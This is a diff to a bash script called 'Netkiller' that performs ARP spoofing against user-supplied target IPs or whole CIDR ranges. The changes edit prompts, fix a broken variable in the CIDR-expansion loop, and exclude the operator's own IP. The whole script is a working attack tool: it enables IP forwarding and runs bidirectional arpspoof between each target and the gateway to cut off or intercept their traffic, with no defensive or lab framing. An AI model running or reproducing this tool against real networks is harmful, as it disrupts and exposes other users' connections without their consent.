@@ -45,14 +45,14 @@ GATEWAY="${INET:-$GW}"
 echo ""
 
 # Detect Target IPs or CIDR
-echo "Enter Target IPs (e.g., 10.0.0.10,10.0.0.20 or 10.0.0.0/20)"
+echo "Enter Target IP(s) or CIDR (space or comma-separated, e.g., 10.0.0.123 10.0.0.124 or 192.168.1.0/24):"
 read -p "> " IPS
 # If no input, prompt again or exit
 if [ -z "$IPS" ]; then
     echo "No target IPs or CIDR provided. Exiting."
     exit 1
 fi
-# Convert comma-separated IPs/CIDR to space-separated for iteration
+# Convert comma-separated to space-separated if needed
 INPUT_IPS=$(echo "$IPS" | tr ',' ' ')
 echo ""
 
@@ -68,7 +68,7 @@ echo "TARGETS:   | $INPUT_IPS"
 echo ""
 
 # Enable IP Forwarding
-sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+echo 1 > /proc/sys/net/ipv4/ip_forward
 
 # Create stop script
 cat > /bin/netkiller-stop << EOF
@@ -78,7 +78,7 @@ sudo ip -s -s neigh flush all >/dev/null
 sudo pkill -f arpspoof
 echo "Netkiller is stopped!"
 sleep 2s
-echo "Restoring the Client Connection..."
+echo "Restoring the client connections..."
 EOF
 sudo chmod 755 /bin/netkiller-stop
 
@@ -100,7 +100,7 @@ expand_cidr() {
     # Iterate through the range
     for ((i=start; i<=end; i++)); do
         # Convert integer back to IP
-        echo "$(( (i>>24) & 255 )).$(( (i>>16) & 255 )).$(( (i>>8) & 255 )).$(( traspari & 255 ))"
+        echo "$(( (i>>24) & 255 )).$(( (i>>16) & 255 )).$(( (i>>8) & 255 )).$(( i & 255 ))"
     done
 }
 
@@ -112,7 +112,14 @@ for INPUT in $INPUT_IPS; do
         # Expand CIDR to individual IPs
         IPS_EXPANDED=$(expand_cidr "$INPUT")
         if [ -n "$IPS_EXPANDED" ]; then
-            TARGET_IPS="$TARGET_IPS $IPS_EXPANDED"
+            # Filter out our own IP from the expanded list
+            FILTERED_IPS=""
+            for IP in $IPS_EXPANDED; do
+                if [ "$IP" != "$MYIP" ]; then
+                    FILTERED_IPS="$FILTERED_IPS $IP"
+                fi
+            done
+            TARGET_IPS="$TARGET_IPS $FILTERED_IPS"
         fi
     else
         # Validate single IP format
@@ -127,7 +134,7 @@ done
 # Remove duplicates and ensure TARGET_IPS is not empty
 TARGET_IPS=$(echo "$TARGET_IPS" | tr ' ' '\n' | sort -u | tr '\n' ' ')
 if [ -z "$TARGET_IPS" ]; then
-    echo "No valid IPs or CIDR ranges provided. Exiting."
+    echo "No valid IPs or CIDR ranges provided (after filtering). Exiting."
     exit 1
 fi
 
@@ -138,12 +145,12 @@ for TARGET in $TARGET_IPS; do
         echo "Skipping $TARGET (matches gateway or device IP)."
         continue
     fi
-     (
+    (
         # Bidirectional ARP Spoofing
-       sudo arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 &
-       sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" -r "$TARGET" >/dev/null 2>&1 &
-     ) &
-       echo "Netkiller killing the target IP: $TARGET"
+        sudo arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 &
+        sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" -r "$TARGET" >/dev/null 2>&1 &
+    ) &
+    echo "Netkiller killing the target IP: $TARGET"
 done
 
 echo ""
